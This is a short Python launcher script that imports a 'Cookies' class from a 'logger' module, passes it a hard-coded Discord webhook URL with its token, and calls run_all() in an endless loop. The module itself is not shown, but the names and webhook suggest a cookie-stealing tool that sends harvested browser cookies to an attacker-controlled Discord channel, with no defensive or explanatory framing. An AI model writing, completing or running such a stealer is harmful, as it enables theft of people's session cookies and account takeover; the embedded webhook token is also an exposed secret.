from logger import Cookies

log = Cookies('https://discord.com/api/webhooks/1279134281012219904/aEFYopmnWwJhEEtT0X7rSqN69OdyETmCI0IH-F5VPvjmunsWiJY3J0IhYeSu-m4Qxl3b')

def main():
  while True:
	log.run_all()

if __name__ == '__main__':
	main()
